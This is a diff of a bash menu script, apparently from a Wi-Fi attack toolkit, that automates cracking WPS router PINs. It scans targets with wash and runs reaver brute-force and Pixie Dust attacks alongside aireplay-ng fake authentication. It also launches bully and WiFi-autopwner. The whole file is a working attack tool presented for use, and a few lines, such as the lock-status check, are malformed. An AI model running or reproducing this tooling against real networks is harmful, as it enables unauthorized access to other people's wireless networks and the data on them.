@@ -18,6 +18,22 @@ PAKTGB="Press "$YS"any key$CE to go back..."
 printf '\033]2;WPS MENU\a'
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
+function reaver_attack
+{
+	clear
+	xterm -geometry 90x70+0+0 -e "sleep 10 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
+	reaver -i $WLANNM -b $BSSIDT -v -N -A | tee /root/lscript/wpslog
+	echo -e "Press "$YS"enter"$CE" to go back"
+	read	
+}
+function pixie_attack
+{
+	clear
+	xterm -geometry 90x70+0+0 -e "sleep 10 && aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -K 1 -S -N -A -vvv | tee /root/lscript/wpslog
+	echo -e "Press "$YS"enter"$CE" to go back"
+	read
+}
 function reaver_wpastart
 {
 	reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
@@ -34,72 +50,182 @@ function associate_aireplay
 	clear
 	exec bash "$0"
 }
+function wash_awk
+{
+file="/root/lscript/tempwash"
+linestotal=$(cat $file | awk 'END{print NR}')
+lines=$((linestotal-7))
+n=1
+echo -e "    BSSID             CH ESSID"
+while [ $n -le "$lines" ]
+do
+	nnn=$((n+7))
+	nnum[$n]=$nnn
+	abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
+	achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
+	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $6}')
+	alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
+	if [ $alock[$nnn] = "No" ]
+	then
+		locked="$RS"
+	else
+		locked="$YS"
+	fi
+	size=${#achannel[$nnn]}
+	if [ $n -le 9 ]
+	then
+		if [ $size = 2 ]
+		then
+			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+		else
+			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+		fi
+	else
+		if [ $size = 2 ]
+		then
+			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+		else
+			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+		fi
+	fi
+	n=$(( n+1 ))
+done
+}
+
+####################################
+while true
+do
+clear
 echo -e "-------------------------"$RS"Finding WPS pin"$CE"-------------------------"
-echo -e ""$YS" 1"$CE") Scan with wash"
-echo -e ""$YS" 2"$CE") Reaver (slow)"
+if [[ $ESSIDT = "" ]]
+then
+	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$RS"None"$CE""
+else
+	echo -e ""$YS" 1"$CE") Scan with wash         Selected: "$YS"$ESSIDT"$CE""
+fi
+echo -e ""$YS" 2"$CE") Reaver bruteforce      (slow)"
 echo -e ""$YS" 3"$CE") Reaver (if you already have the WPS pin)"
-echo -e ""$YS" 4"$CE") Pixie Dust (fast)"
+echo -e ""$YS" 4"$CE") Pixie Dust             (fast)"
 echo -e ""$YS" 5"$CE") Bully - automated tool"
 echo -e ""$YS" 6"$CE") WiFi autopwner - automated tool"
+echo -e ""$YS" 7"$CE") See latest log"
 echo -e ""$YS" 0"$CE") EXIT"
+echo -e "Choose: "
 read -e YN
 if [ "$YN" = "1" ]
 then
-	echo -e "Scaning in new terminal..."
-	sleep 1
-	gnome-terminal --geometry 90x15+9999+9999 -e "wash -i $WLANNM && read "
-	clear
-	exec bash "$0"
+	while true
+	do
+		clear
+		echo -e "Scaning in new terminal..."
+		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
+		sleep 1
+		xterm -geometry 80x25+9999+9999 -e "wash  -i $WLANNM | tee /root/lscript/tempwash "
+		clear
+		wash_awk
+		echo -e ""$YS" r"$CE") Rescan"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e "Choose: "
+		read WASHSCAN
+		if [ $WASHSCAN = "r" ]
+		then
+			continue
+		elif [ $WASHSCAN = "back" ]
+		then
+			break
+		else
+			WASHSCAN2=${nnum[$WASHSCAN]}
+			BSSIDT="${abssid[$WASHSCAN2]}"
+			CHANT="${achannel[$WASHSCAN2]}"
+			ESSIDT="${aessid[$WASHSCAN2]}"
+			while true
+			do
+				clear
+				echo -e ""$RS"----------You need strong connection------------"$CE""
+				echo -e ""$YS" 1"$CE") Pixie dust       fast"
+				echo -e ""$YS" 2"$CE") Bruteforse       slow"
+				#~ echo -e ""$YS" 3"$CE") Restart Authenticating"
+				echo -e ""$YS" r"$CE") Rescan"
+				echo -e ""$YS"back"$CE") Go back"
+				echo -e "Choose: "
+				read WPSL
+				if [ $WPSL = "r" ]
+				then
+					RESCAN=1
+					break
+				elif [ $WPSL = "back" ]
+				then
+					break
+				elif [ $WPSL = "1" ]
+				then
+					pixie_attack
+				elif [ $WPSL = "2" ]
+				then
+					reaver_attack
+				fi
+			done
+			if [ $RESCAN = 1 ]
+			then
+				continue
+			else
+				break
+			fi
+		fi
+	done
 elif [ "$YN" = "2" ]
 then
-	echo -e "Enter your target's BSSID: "
-	read -e BSSIDT
-	echo -e "Enter your target's channel: "
-	read -e CHANT
-	echo -e "Enter the delay of every pin(WARNING: Put "$YS"30"$CE".The router may block you otherwise.): "
-	read -e DELT
-	export BSSIDT
-	export CHANT
-	export DELT
-	clear
-	echo -e "Starting reaver in a new terminal"
-	sleep 1
-	GLV="2"
-	export GLV
-	gnome-terminal -e lh31	
-	clear
-	exec bash "$0"
+	reaver_attack
+	#~ echo -e "Enter your target's BSSID: "
+	#~ read -e BSSIDT
+	#~ echo -e "Enter your target's channel: "
+	#~ read -e CHANT
+	#~ echo -e "Enter the delay of every pin(WARNING: Put "$YS"30"$CE".The router may block you otherwise.): "
+	#~ read -e DELT
+	#~ export BSSIDT
+	#~ export CHANT
+	#~ export DELT
+	#~ clear
+	#~ echo -e "Starting reaver in a new terminal"
+	#~ sleep 1
+	#~ GLV="2"
+	#~ export GLV
+	#~ gnome-terminal -e lh31	
+	#~ clear
+	#~ exec bash "$0"
 elif [ "$YN" = "3" ]
 then
-	echo -e "Enter your target's BSSID: "
-	read -e BSSIDT
 	echo -e "Enter your target's WPS pin: "
 	read -e WPST
-	export BSSIDT
-	export WPST
-	export reaver_wpastart
-	echo -e "Starting reaver in a new terminal"
-	sleep 1
-	GLV="3"
-	export GLV
+	#~ export BSSIDT
+	#~ export WPST
+	#~ export reaver_wpastart
+	#~ echo -e "Starting reaver in a new terminal"
+	#~ sleep 1
+	#~ GLV="3"
+	#~ export GLV
+	#~ clear
+	#~ gnome-terminal -e lh31
+	#~ clear
+	#~ exec bash "$0"
 	clear
-	gnome-terminal -e lh31
-	clear
-	exec bash "$0"
+	reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
+	echo -e "Press "$YS"enter"$CE" to go back"
+	read
 elif [ "$YN" = "4" ]
 then
-	echo -e "Enter your target's BSSID: "
-	read -e BSSIDT
-	echo -e "Enter your target's channel: "
-	read -e CHANT
-	export CHANT
-	export BSSIDT
-	clear
-	reaver -i $WLANNM -b $BSSIDT -vvv -K 1 -c $CHANT -w
-	echo -e "$PAKTC"
-	read
-	clear
-	exec bash "$0"
+	pixie_attack
+	#~ echo -e "Enter your target's BSSID: "
+	#~ read -e BSSIDT
+	#~ echo -e "Enter your target's channel: "
+	#~ read -e CHANT
+	#~ export CHANT
+	#~ export BSSIDT
+	#~ clear
+	#~ reaver -i $WLANNM -b $BSSIDT -vvv -K 1 -c $CHANT -w
+	#~ echo -e "$PAKTC"
+	#~ read
+	#~ clear
+	#~ exec bash "$0"
 elif [ "$YN" = "5" ]
 then
 	cd /root/bully/src
@@ -110,31 +236,13 @@ then
 	cd /root/WiFi-autopwner
 	./wifi-autopwner.sh
 	cd
+elif [ "$YN" = "7" ]
+then
+	cat /root/lscript/wpslog
+	echo -e "Press "$YS"enter"$CE" to go back"
+	read
 elif [ "$YN" = "0" ]
 then
 	exit
 fi
-echo -e "Choose again?"$YNYES": "
-read -e BB
-if [ -z "$BB" ]
-then
-	if [ "$AA" = "1" ]
-		then
-		exec bash "$0"
-	else
-		clear
-		exec bash "$0"
-	fi
-elif [ "$BB" = "y" ]
-then
-	if [ "$AA" = "1" ]
-		then
-		exec bash "$0"
-	else
-		clear
-		exec bash "$0"
-	fi
-else
-	clear
-	exit
-fi
+done
